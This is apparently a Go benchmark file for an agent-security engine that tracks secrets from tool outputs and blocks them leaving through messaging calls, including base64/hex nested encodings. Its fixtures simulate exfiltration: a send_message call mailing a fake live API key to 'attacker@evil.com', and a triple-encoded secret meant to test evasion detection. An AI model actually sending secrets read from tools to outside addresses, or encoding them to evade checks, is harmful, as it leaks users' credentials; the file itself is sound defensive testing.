package engine

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"testing"

	"github.com/yxshwanth/Interlock/internal/model"
)

const benchSecret = "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"

func benchTainted(n int) []model.TaintedValue {
	out := make([]model.TaintedValue, n)
	for i := 0; i < n; i++ {
		val := fmt.Sprintf("%s-%d", benchSecret, i)
		out[i] = model.TaintedValue{
			Value:    val,
			Variants: CanonicalEncodings(val),
			Hash:     HashValue(val),
			Preview:  MaskValue(val),
		}
	}
	return out
}

func benchSinkArgs() json.RawMessage {
	return json.RawMessage(`{"to":"attacker@evil.com","body":"` + benchSecret + `"}`)
}

// benchSinkArgsMiss has no substring of any benchTaintedScale value — forces full scan.
func benchSinkArgsMiss() json.RawMessage {
	return json.RawMessage(`{"to":"ops@example.com","body":"status update: all clear, no tokens"}`)
}

// benchTaintedScale builds n distinct secrets with full CanonicalEncodings.
// The first entry uses bare benchSecret so HitPath can match early via benchSinkArgs.
func benchTaintedScale(n int) []model.TaintedValue {
	out := make([]model.TaintedValue, n)
	out[0] = model.TaintedValue{
		Value:    benchSecret,
		Variants: CanonicalEncodings(benchSecret),
		Hash:     HashValue(benchSecret),
		Preview:  MaskValue(benchSecret),
	}
	for i := 1; i < n; i++ {
		val := fmt.Sprintf("%s-%d", benchSecret, i)
		out[i] = model.TaintedValue{
			Value:    val,
			Variants: CanonicalEncodings(val),
			Hash:     HashValue(val),
			Preview:  MaskValue(val),
		}
	}
	return out
}

func BenchmarkCanonicalEncodings(b *testing.B) {
	for b.Loop() {
		_ = CanonicalEncodings(benchSecret)
	}
}

func BenchmarkCheckOverlap_1Tainted(b *testing.B) {
	tainted := benchTainted(1)
	args := benchSinkArgs()
	b.ResetTimer()
	for b.Loop() {
		CheckOverlap(tainted, args)
	}
}

func BenchmarkCheckOverlap_10Tainted(b *testing.B) {
	tainted := benchTainted(10)
	args := benchSinkArgs()
	b.ResetTimer()
	for b.Loop() {
		CheckOverlap(tainted, args)
	}
}

func BenchmarkCheckOverlap_50Tainted(b *testing.B) {
	tainted := benchTainted(50)
	args := benchSinkArgs()
	b.ResetTimer()
	for b.Loop() {
		CheckOverlap(tainted, args)
	}
}

func BenchmarkCheckOverlap_Scale(b *testing.B) {
	for _, n := range []int{100, 1000, 10000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			tainted := benchTaintedScale(n)
			args := benchSinkArgsMiss() // miss path — worst case
			b.ResetTimer()
			for b.Loop() {
				CheckOverlap(tainted, args)
			}
		})
	}
}

func BenchmarkCheckOverlap_MissPath(b *testing.B) {
	for _, n := range []int{100, 1000, 10000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			tainted := benchTaintedScale(n)
			args := benchSinkArgsMiss()
			b.ResetTimer()
			for b.Loop() {
				if hit := CheckOverlap(tainted, args); hit != nil {
					b.Fatal("expected miss")
				}
			}
		})
	}
}

// BenchmarkCheckOverlap_DecodeMissPath measures miss-path cost when sink leaves
// look base64-encodable (decoder runs) but do not unwrap to any registered secret.
func BenchmarkCheckOverlap_DecodeMissPath(b *testing.B) {
	tainted := benchTaintedScale(1000)
	// Valid base64 of unrelated ASCII — forces decode attempts, no secret match.
	noise := base64.StdEncoding.EncodeToString([]byte("status update: all clear, no tokens in this payload at all"))
	args := json.RawMessage(`{"to":"ops@example.com","body":"` + noise + `"}`)
	b.ResetTimer()
	for b.Loop() {
		if hit := CheckOverlap(tainted, args); hit != nil {
			b.Fatal("expected miss")
		}
	}
}

// BenchmarkCheckOverlap_DecodeHitPath measures depth-3 nest detection cost.
func BenchmarkCheckOverlap_DecodeHitPath(b *testing.B) {
	secret := benchSecret
	inner := base64.StdEncoding.EncodeToString([]byte(secret))
	mid := hex.EncodeToString([]byte(inner))
	triple := base64.StdEncoding.EncodeToString([]byte(mid))
	tainted := []model.TaintedValue{{
		Value:    secret,
		Variants: CanonicalEncodings(secret),
		Hash:     HashValue(secret),
		Preview:  MaskValue(secret),
	}}
	args := json.RawMessage(`{"body":"` + triple + `"}`)
	b.ResetTimer()
	for b.Loop() {
		if hit := CheckOverlap(tainted, args); hit == nil {
			b.Fatal("expected hit")
		}
	}
}

func BenchmarkCheckOverlap_HitPath(b *testing.B) {
	for _, n := range []int{100, 1000, 10000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			tainted := benchTaintedScale(n)
			args := benchSinkArgs() // matches tainted[0] early
			b.ResetTimer()
			for b.Loop() {
				if hit := CheckOverlap(tainted, args); hit == nil {
					b.Fatal("expected hit")
				}
			}
		})
	}
}

func BenchmarkEvaluateRequest_Exfil_Scale(b *testing.B) {
	for _, n := range []int{100, 1000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			eng, _ := newTestEngine("block")
			sid := fmt.Sprintf("bench-exfil-scale-%d", n)
			state := eng.store.GetOrCreate(sid)
			state.Tainted = benchTaintedScale(n)
			sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
				`{"to":"attacker@evil.com","body":"`+benchSecret+`"}`)
			b.ResetTimer()
			for b.Loop() {
				eng.EvaluateRequest(sinkCall)
			}
		})
	}
}

func BenchmarkEngine_IngestResult_TaintExtract(b *testing.B) {
	eng, _ := newTestEngine("block")
	ev := makeResultEvent("bench", "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+benchSecret+`"}]}`)
	// Warm legs once so iterations measure registration, not first-lit bookkeeping.
	eng.IngestResult(ev)
	b.ResetTimer()
	for b.Loop() {
		state := eng.store.Get("bench")
		state.Tainted = nil
		eng.IngestResult(ev)
	}
}

func BenchmarkEngine_EvaluateRequest_Exfil(b *testing.B) {
	eng, _ := newTestEngine("block")
	sid := "bench-exfil"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+benchSecret+`"}]}`))
	sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"attacker@evil.com","body":"`+benchSecret+`"}`)
	b.ResetTimer()
	for b.Loop() {
		eng.EvaluateRequest(sinkCall)
	}
}
